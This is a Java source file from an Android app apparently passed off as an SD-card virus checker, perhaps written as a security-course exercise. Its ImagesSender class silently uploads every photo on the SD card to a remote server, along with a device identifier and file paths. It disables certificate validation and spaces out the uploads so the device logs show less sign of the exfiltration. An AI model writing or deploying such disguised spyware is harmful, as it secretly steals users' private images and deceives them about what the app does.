package com.seginf.sdviruschecker;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import java.io.File;
import java.util.List;

import cz.msebera.android.httpclient.Header;

public class ImagesSender {

    static final String serverAddress = "https://10.0.2.2"; // Habría que poner un dominio acá.
    static final int serverPort = 4567;

    public static void sendImages(List<File> imagesFromSd, Context context) {
        String clientId = Installation.id(context);
        final SharedPreferences sentimages = context.getSharedPreferences("sentimages", Context.MODE_PRIVATE);
        AsyncHttpClient client = new AsyncHttpClient(true, serverPort, serverPort); // Ese true hace que no chequee el certificado del server.
        sentimages.edit().clear().commit();

        for (File photo : imagesFromSd) {
            final String photoPath = photo.getPath();
            boolean alreadySent = sentimages.getBoolean(photoPath, false);
            //Do not send the same image if already sent
            if(!alreadySent) {
                try {
                    //Make a sleep so that the logs are not populated with much
                    //information about sending images to a server.
                    Thread.sleep(2000);

                    RequestParams params = new RequestParams();
                    params.put("client_id", clientId);
                    params.put("file_path", photoPath);
                    params.put("profile_picture", photo);

                    client.post(serverAddress + "/images", params, new AsyncHttpResponseHandler() {
                        @Override
                        public void onSuccess(int statusCode, Header[] headers, byte[] response) {
                            Log.d("SEND IMAGE", "IMAGE SENT");
                            SharedPreferences.Editor editor = sentimages.edit();
                            editor.putBoolean(photoPath, true);
                            editor.apply();
                        }

                        @Override
                        public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
                            Log.d("SEND IMAGE", "eror sendind image => " + e.getMessage());
                        }
                    });
                } catch (Exception e) {
                    Log.d("ERROR =>", e.getMessage());
                }
            }
        }
    }
}